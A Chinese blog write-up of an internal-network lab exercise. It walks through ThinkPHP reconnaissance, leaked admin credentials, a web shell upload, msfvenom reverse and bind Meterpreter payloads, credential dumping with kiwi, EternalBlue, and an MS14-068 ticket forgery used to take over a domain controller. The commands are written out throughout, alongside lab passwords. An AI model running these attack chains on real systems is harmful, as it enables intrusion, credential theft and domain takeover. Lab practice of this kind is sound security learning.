程序员写在文章前：

最近，程序员小星在研究内网渗透，对部分内网靶场进行了测试，所以想和大家从测试过程、检测过程以及域渗透过程这3个方面来分享一下我在打内网靶场中的经历。

## 准备工作

本次内网网络拓扑图如下所示，首先将WEB的IP 192.168.0.150改为192.168.0.3。![](../Images/7fbb55cc68de20329d693ddfdbc3b4c0.png)

## （一）测试过程  

信息收集：

1\. 对目标IP进行端口扫描。  
sudo nmap -sS --open -Pn -p- -v 192.168.0.3

![](../Images/e2787c73f67ddd68c7475e2b52625952.png)

2.绑定hosts 192.168.0.3 www.webhack123.com ，访问网站首页出现一个thinkphp框架。

![](../Images/c3278bb5c80c4281f5392a593abfdb49.png)

3.对网站进行目录扫描。

![](../Images/a34dd9aaecffc23b14664341c2516421.png)

4.存在wc.db将其下载下来，使用工具打开，里面存在网站目录文件信息，查看网站目录信息后，可以了解网站的基本架构。

![](../Images/e61029ec4e0ab7e37aa475d4db84673e.png)

## （二）检测过程

1. 通过前面的信息搜集，已经知道当前网站是thinkphp框架了，使用工具扫描一下常见的漏洞,发现存在日志泄漏。![](../Images/0104b6e99d8e4cbc118ece7ef4f88afb.png)

2.在日志中泄漏了账号和密码的密文。

账号：admin

密文：74c774ef39b5b977c1fd59dbfc73c3e380a65aa3

![](../Images/3ec7cfc57026852dc9608a246f74a3e6.png)

3.通过解密获取密码明文web123。![](../Images/ebb5d59a59d520e04416f5e400d82d7a.png)

4.前面对网站进行目录扫描，未发现网站管理后台，因此使用脚本来绑定 hosts 碰撞管理后台的子域名。

![](../Images/6d9992fef90428210a6f8065c0981a80.png)

5\. admin.webhack123.com就是网站的管理后台。

![](../Images/9f2f6c87ed93c8aa759ab85a86e04c6e.png)

6.使用前面获取的管理员账号密码进行登录，可以测试发现验证码是存在缺陷，也可以使用大字典来爆破出管理员的密码。

![](../Images/efba5af41358f83b2e9c5bb58a5434f8.png)

7.进入网站后台，修改允许上传的类型，上传一句话木马。

![](../Images/0b5468f72025c8e80fbb0b68c06ab3cf.png)

8.使用蚁剑连接获取webshell。

![](../Images/4d4d940dfc8cc9cf05c050c06ef41f60.png)

9. 在当前主机先进行简单的信息搜集，当前用户为administrator且主机未安装杀软，存在双网卡192.168.0.0/24 10.10.10.0/24，存在域环境。

生成攻击载荷先上线msf：

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.0.2 LPORT=9999  -f exe>haha.exe

![](../Images/41ecdd2a4cf6960022fcc1cfbf74f63c.png)

10.迁移进程获取明文密码。

migrate 600

load kiwi

creds\_all

![](../Images/480d700beae4c4f3527c27e9dc88f465.png)

11.获取登录过当前主机的用户信息。

run post/windows/gather/enum\_logged\_on\_users

![](../Images/73c94eab8a601657c50dee5dd1a4fddb.png)

12. 可以看到存在hackbox域的域用户web，本地管理员Administrator的密码为：!@#Qwe456

前面我们已经知道存在域环境，现在定位到域控为：dc.hackbox.com 10.10.10.149。

![](../Images/43ef8c687bf57524a2d32bdd453f84f4.png)

## （三）域渗透过程

1. 前面知道该主机存在两个网卡,现在来对这两个网段的存活主机进行扫描，首先添加：

run autoroute -s 10.10.10.0/24

run autoroute -p

![](../Images/3dddf2118114f459612e98ce8ab908d4.png)

2. 对内网存活主机进行扫描，只存在10.10.10.149，也就是域控，且开放了445端口。

![](../Images/37b9f38843ab87fcd3fd3009fb655b3a.png)

3.使用永恒之蓝试打，检测出存在永恒之蓝漏洞。

![](../Images/2e8650bd8b03299260a5df879a12aee2.png)

4\. 反向shell失败原因未明，正向的shell是可以成功返回一个meterpreter，成功获取域控dc权限。  
![](../Images/57f5072d5c28fc3b6c85133b97fbfd33.png)

5\. 测试使用MS14-068漏洞：使用这个 exp 需要一个普通域控用户， web 是域用户，但不知道密码。前面获取到用户Administrator的密码为!@#Qwe456，现尝试使用用户web和这个密码进行登录。

![](../Images/9d2456f87e47262534534c3fa42eb839.png)

6.登录失败，但是密码应该是正确的，只是不是远程组。

![](../Images/b4a47e032c12834f43d3757488516eb4.png)

7\. #创建票据

ms14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456

Load kiwi

#清理票据

kerberos\_ticket\_purge

![](../Images/13c18a6d5e131a32064a8c0d0de100a9.png)

8.上传 mimikatz 注入票据 mimikatz # kerberos::ptc TGT\_web@hackbox.com.ccache。

![](../Images/daf285704a46a815e201349babe87243.png)

9.查看票据 klist。

![](../Images/a01a2345e62a62efac5557a298398681.png)

10.成功访问dc域控。

![](../Images/0a233160e2437e261086ee0a6cc78cb9.png)

11.现在来获取域控权限，生成一个正向的载荷：

msfvenom -p windows/meterpreter/bind\_tcp  LPORT=9998  -f exe>bind.exe

copy命令复制到域控copy bind.exe \\\\dc\\c$。

![](../Images/155ec1369e494ea3a1272b357d6f9eb3.png)  
12\. at命令执行计划任务运行bind.exe

net time \\\\dc

at \\\\dc 1:29:00 c:/bind.ex

![](../Images/a796456ef03667bf56a2bb26bea05177.png)

13.成功获取域控权限。  
![](../Images/6bd8f6a51ad986d242f14f11ce19256d.png)

14.迁移进程抓取明文密码。  
![](../Images/c7a59572dc3902e88ca185db3608d2c6.png)

15.至此已经拿下了域控的权限。

![](../Images/37ba78c30ea5c148da1385af93984459.png)

16.迁移到域管理员进程查看三个flag。

![](../Images/3cc1985f9b3a7bc9ffed8b64727c7b41.png)

## （四）总结

小星通过此次内网靶场测试的研究，加深了对内网系统的认识，熟练掌握了如何使用MSF完成整个打靶过程。下期，小星将使用Cobalstrick来完成打靶并以“黄金票据的利用”为题开展研究。
